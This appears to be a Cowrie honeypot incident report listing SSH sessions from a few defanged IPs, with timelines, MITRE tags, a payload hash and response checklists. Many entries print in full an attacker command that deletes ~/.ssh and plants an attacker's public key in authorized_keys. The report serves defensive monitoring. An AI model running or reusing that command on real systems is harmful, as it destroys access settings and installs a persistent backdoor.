| Field | Detail |
|---|---|
| **Source IP** | `8.154.2[.]19` |
| **First Seen** | 2026-06-03 14:55 |
| **Last Seen** | 2026-06-03 14:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 14:55:18` | `cowrie.session.connect` |
| `2026-06-03 14:55:18` | `cowrie.client.version` |
| `2026-06-03 14:55:18` | `cowrie.client.kex` |
| `2026-06-03 14:55:19` | `cowrie.login.success` |
| `2026-06-03 14:55:19` | `cowrie.session.params` |
| `2026-06-03 14:55:19` | `cowrie.command.input` |
| `2026-06-03 14:55:19` | `cowrie.command.failed` |
| `2026-06-03 14:55:19` | `cowrie.log.closed` |
| `2026-06-03 14:55:19` | `cowrie.session.params` |
| `2026-06-03 14:55:19` | `cowrie.command.input` |
| `2026-06-03 14:55:19` | `cowrie.session.file_download` |
| `2026-06-03 14:55:19` | `cowrie.log.closed` |
| `2026-06-03 14:55:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.154.2[.]19` to AbuseIPDB if not already reported
- [ ] Block `8.154.2[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bcb62d9bc80

| Field | Detail |
|---|---|
| **Source IP** | `8.154.2[.]19` |
| **First Seen** | 2026-06-03 14:55 |
| **Last Seen** | 2026-06-03 14:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 14:55:21` | `cowrie.session.connect` |
| `2026-06-03 14:55:21` | `cowrie.client.version` |
| `2026-06-03 14:55:22` | `cowrie.client.kex` |
| `2026-06-03 14:55:22` | `cowrie.login.success` |
| `2026-06-03 14:55:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.154.2[.]19` to AbuseIPDB if not already reported
- [ ] Block `8.154.2[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48219d471963

| Field | Detail |
|---|---|
| **Source IP** | `8.154.2[.]19` |
| **First Seen** | 2026-06-03 14:56 |
| **Last Seen** | 2026-06-03 14:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 14:56:18` | `cowrie.session.connect` |
| `2026-06-03 14:56:18` | `cowrie.client.version` |
| `2026-06-03 14:56:18` | `cowrie.client.kex` |
| `2026-06-03 14:56:18` | `cowrie.login.success` |
| `2026-06-03 14:56:19` | `cowrie.session.params` |
| `2026-06-03 14:56:19` | `cowrie.command.input` |
| `2026-06-03 14:56:19` | `cowrie.command.failed` |
| `2026-06-03 14:56:19` | `cowrie.log.closed` |
| `2026-06-03 14:56:19` | `cowrie.session.params` |
| `2026-06-03 14:56:19` | `cowrie.command.input` |
| `2026-06-03 14:56:19` | `cowrie.session.file_download` |
| `2026-06-03 14:56:19` | `cowrie.log.closed` |
| `2026-06-03 14:56:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.154.2[.]19` to AbuseIPDB if not already reported
- [ ] Block `8.154.2[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-379b8aeff45d

| Field | Detail |
|---|---|
| **Source IP** | `8.154.2[.]19` |
| **First Seen** | 2026-06-03 14:56 |
| **Last Seen** | 2026-06-03 14:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 14:56:21` | `cowrie.session.connect` |
| `2026-06-03 14:56:21` | `cowrie.client.version` |
| `2026-06-03 14:56:21` | `cowrie.client.kex` |
| `2026-06-03 14:56:22` | `cowrie.login.success` |
| `2026-06-03 14:56:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.154.2[.]19` to AbuseIPDB if not already reported
- [ ] Block `8.154.2[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce993104f024

| Field | Detail |
|---|---|
| **Source IP** | `8.154.2[.]19` |
| **First Seen** | 2026-06-03 14:56 |
| **Last Seen** | 2026-06-03 14:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 14:56:38` | `cowrie.session.connect` |
| `2026-06-03 14:56:38` | `cowrie.client.version` |
| `2026-06-03 14:56:39` | `cowrie.client.kex` |
| `2026-06-03 14:56:39` | `cowrie.login.success` |
| `2026-06-03 14:56:39` | `cowrie.session.params` |
| `2026-06-03 14:56:39` | `cowrie.command.input` |
| `2026-06-03 14:56:39` | `cowrie.command.failed` |
| `2026-06-03 14:56:40` | `cowrie.log.closed` |
| `2026-06-03 14:56:40` | `cowrie.session.params` |
| `2026-06-03 14:56:40` | `cowrie.command.input` |
| `2026-06-03 14:56:40` | `cowrie.session.file_download` |
| `2026-06-03 14:56:40` | `cowrie.log.closed` |
| `2026-06-03 14:56:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.154.2[.]19` to AbuseIPDB if not already reported
- [ ] Block `8.154.2[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6b08d0456f9

| Field | Detail |
|---|---|
| **Source IP** | `8.154.2[.]19` |
| **First Seen** | 2026-06-03 14:56 |
| **Last Seen** | 2026-06-03 14:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 14:56:42` | `cowrie.session.connect` |
| `2026-06-03 14:56:42` | `cowrie.client.version` |
| `2026-06-03 14:56:42` | `cowrie.client.kex` |
| `2026-06-03 14:56:43` | `cowrie.login.success` |
| `2026-06-03 14:56:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.154.2[.]19` to AbuseIPDB if not already reported
- [ ] Block `8.154.2[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bee1b9966a29

| Field | Detail |
|---|---|
| **Source IP** | `52.177.169[.]196` |
| **First Seen** | 2026-06-03 14:58 |
| **Last Seen** | 2026-06-03 14:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 14:58:51` | `cowrie.session.connect` |
| `2026-06-03 14:58:51` | `cowrie.client.version` |
| `2026-06-03 14:58:51` | `cowrie.client.kex` |
| `2026-06-03 14:58:52` | `cowrie.login.success` |
| `2026-06-03 14:58:52` | `cowrie.session.params` |
| `2026-06-03 14:58:52` | `cowrie.command.input` |
| `2026-06-03 14:58:52` | `cowrie.command.failed` |
| `2026-06-03 14:58:52` | `cowrie.log.closed` |
| `2026-06-03 14:58:53` | `cowrie.session.params` |
| `2026-06-03 14:58:53` | `cowrie.command.input` |
| `2026-06-03 14:58:53` | `cowrie.session.file_download` |
| `2026-06-03 14:58:53` | `cowrie.log.closed` |
| `2026-06-03 14:58:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.177.169[.]196` to AbuseIPDB if not already reported
- [ ] Block `52.177.169[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7344a198b22b

| Field | Detail |
|---|---|
| **Source IP** | `52.177.169[.]196` |
| **First Seen** | 2026-06-03 14:58 |
| **Last Seen** | 2026-06-03 14:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 14:58:56` | `cowrie.session.connect` |
| `2026-06-03 14:58:56` | `cowrie.client.version` |
| `2026-06-03 14:58:56` | `cowrie.client.kex` |
| `2026-06-03 14:58:57` | `cowrie.login.success` |
| `2026-06-03 14:58:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.177.169[.]196` to AbuseIPDB if not already reported
- [ ] Block `52.177.169[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ad8966058e8

| Field | Detail |
|---|---|
| **Source IP** | `52.177.169[.]196` |
| **First Seen** | 2026-06-03 15:04 |
| **Last Seen** | 2026-06-03 15:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 15:04:59` | `cowrie.session.connect` |
| `2026-06-03 15:04:59` | `cowrie.client.version` |
| `2026-06-03 15:05:00` | `cowrie.client.kex` |
| `2026-06-03 15:05:01` | `cowrie.login.success` |
| `2026-06-03 15:05:01` | `cowrie.session.params` |
| `2026-06-03 15:05:01` | `cowrie.command.input` |
| `2026-06-03 15:05:01` | `cowrie.command.failed` |
| `2026-06-03 15:05:01` | `cowrie.log.closed` |
| `2026-06-03 15:05:02` | `cowrie.session.params` |
| `2026-06-03 15:05:02` | `cowrie.command.input` |
| `2026-06-03 15:05:02` | `cowrie.session.file_download` |
| `2026-06-03 15:05:02` | `cowrie.log.closed` |
| `2026-06-03 15:05:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.177.169[.]196` to AbuseIPDB if not already reported
- [ ] Block `52.177.169[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e687c092668c

| Field | Detail |
|---|---|
| **Source IP** | `52.177.169[.]196` |
| **First Seen** | 2026-06-03 15:05 |
| **Last Seen** | 2026-06-03 15:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 15:05:05` | `cowrie.session.connect` |
| `2026-06-03 15:05:05` | `cowrie.client.version` |
| `2026-06-03 15:05:05` | `cowrie.client.kex` |
| `2026-06-03 15:05:06` | `cowrie.login.success` |
| `2026-06-03 15:05:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.177.169[.]196` to AbuseIPDB if not already reported
- [ ] Block `52.177.169[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-542f62a898d2

| Field | Detail |
|---|---|
| **Source IP** | `52.177.169[.]196` |
| **First Seen** | 2026-06-03 15:08 |
| **Last Seen** | 2026-06-03 15:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 15:08:10` | `cowrie.session.connect` |
| `2026-06-03 15:08:10` | `cowrie.client.version` |
| `2026-06-03 15:08:10` | `cowrie.client.kex` |
| `2026-06-03 15:08:11` | `cowrie.login.success` |
| `2026-06-03 15:08:11` | `cowrie.session.params` |
| `2026-06-03 15:08:11` | `cowrie.command.input` |
| `2026-06-03 15:08:11` | `cowrie.command.failed` |
| `2026-06-03 15:08:11` | `cowrie.log.closed` |
| `2026-06-03 15:08:12` | `cowrie.session.params` |
| `2026-06-03 15:08:12` | `cowrie.command.input` |
| `2026-06-03 15:08:12` | `cowrie.session.file_download` |
| `2026-06-03 15:08:12` | `cowrie.log.closed` |
| `2026-06-03 15:08:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.177.169[.]196` to AbuseIPDB if not already reported
- [ ] Block `52.177.169[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05c7b30e5b51

| Field | Detail |
|---|---|
| **Source IP** | `52.177.169[.]196` |
| **First Seen** | 2026-06-03 15:08 |
| **Last Seen** | 2026-06-03 15:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 15:08:15` | `cowrie.session.connect` |
| `2026-06-03 15:08:15` | `cowrie.client.version` |
| `2026-06-03 15:08:15` | `cowrie.client.kex` |
| `2026-06-03 15:08:16` | `cowrie.login.success` |
| `2026-06-03 15:08:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.177.169[.]196` to AbuseIPDB if not already reported
- [ ] Block `52.177.169[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff65fd8713c7

| Field | Detail |
|---|---|
| **Source IP** | `52.177.169[.]196` |
| **First Seen** | 2026-06-03 15:09 |
| **Last Seen** | 2026-06-03 15:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 15:09:14` | `cowrie.session.connect` |
| `2026-06-03 15:09:14` | `cowrie.client.version` |
| `2026-06-03 15:09:14` | `cowrie.client.kex` |
| `2026-06-03 15:09:15` | `cowrie.login.success` |
| `2026-06-03 15:09:16` | `cowrie.session.params` |
| `2026-06-03 15:09:16` | `cowrie.command.input` |
| `2026-06-03 15:09:16` | `cowrie.command.failed` |
| `2026-06-03 15:09:16` | `cowrie.log.closed` |
| `2026-06-03 15:09:16` | `cowrie.session.params` |
| `2026-06-03 15:09:16` | `cowrie.command.input` |
| `2026-06-03 15:09:17` | `cowrie.session.file_download` |
| `2026-06-03 15:09:17` | `cowrie.log.closed` |
| `2026-06-03 15:09:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.177.169[.]196` to AbuseIPDB if not already reported
- [ ] Block `52.177.169[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e4a16352d00

| Field | Detail |
|---|---|
| **Source IP** | `52.177.169[.]196` |
| **First Seen** | 2026-06-03 15:09 |
| **Last Seen** | 2026-06-03 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 15:09:19` | `cowrie.session.connect` |
| `2026-06-03 15:09:19` | `cowrie.client.version` |
| `2026-06-03 15:09:19` | `cowrie.client.kex` |
| `2026-06-03 15:09:20` | `cowrie.login.success` |
| `2026-06-03 15:09:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.177.169[.]196` to AbuseIPDB if not already reported
- [ ] Block `52.177.169[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9ebfd89bdeb

| Field | Detail |
|---|---|
| **Source IP** | `52.177.169[.]196` |
| **First Seen** | 2026-06-03 15:11 |
| **Last Seen** | 2026-06-03 15:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 15:11:17` | `cowrie.session.connect` |
| `2026-06-03 15:11:17` | `cowrie.client.version` |
| `2026-06-03 15:11:18` | `cowrie.client.kex` |
| `2026-06-03 15:11:19` | `cowrie.login.success` |
| `2026-06-03 15:11:19` | `cowrie.session.params` |
| `2026-06-03 15:11:19` | `cowrie.command.input` |
| `2026-06-03 15:11:19` | `cowrie.command.failed` |
| `2026-06-03 15:11:19` | `cowrie.log.closed` |
| `2026-06-03 15:11:20` | `cowrie.session.params` |
| `2026-06-03 15:11:20` | `cowrie.command.input` |
| `2026-06-03 15:11:20` | `cowrie.session.file_download` |
| `2026-06-03 15:11:20` | `cowrie.log.closed` |
| `2026-06-03 15:11:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.177.169[.]196` to AbuseIPDB if not already reported
- [ ] Block `52.177.169[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11ac46219043

| Field | Detail |
|---|---|
| **Source IP** | `52.177.169[.]196` |
| **First Seen** | 2026-06-03 15:11 |
| **Last Seen** | 2026-06-03 15:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 15:11:23` | `cowrie.session.connect` |
| `2026-06-03 15:11:23` | `cowrie.client.version` |
| `2026-06-03 15:11:23` | `cowrie.client.kex` |
| `2026-06-03 15:11:24` | `cowrie.login.success` |
| `2026-06-03 15:11:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.177.169[.]196` to AbuseIPDB if not already reported
- [ ] Block `52.177.169[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7689062620ff

| Field | Detail |
|---|---|
| **Source IP** | `116.255.208[.]96` |
| **First Seen** | 2026-06-03 16:00 |
| **Last Seen** | 2026-06-03 16:02 |
| **Session Duration** | 94s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 16:00:28` | `cowrie.session.connect` |
| `2026-06-03 16:00:28` | `cowrie.client.version` |
| `2026-06-03 16:00:29` | `cowrie.client.kex` |
| `2026-06-03 16:00:30` | `cowrie.login.success` |
| `2026-06-03 16:02:03` | `cowrie.session.file_upload` |
| `2026-06-03 16:02:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.255.208[.]96` to AbuseIPDB if not already reported
- [ ] Block `116.255.208[.]96` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `52.177.169[.]196` | **30** | 2026-06-03 14:28 | 2026-06-03 15:14 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `8.154.2[.]19` | **30** | 2026-06-03 14:44 | 2026-06-03 14:56 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `223.123.124[.]120` | **25** | 2026-06-03 14:35 | 2026-06-03 14:40 | 5m | 0 | `T1592` | 🟠 MEDIUM |
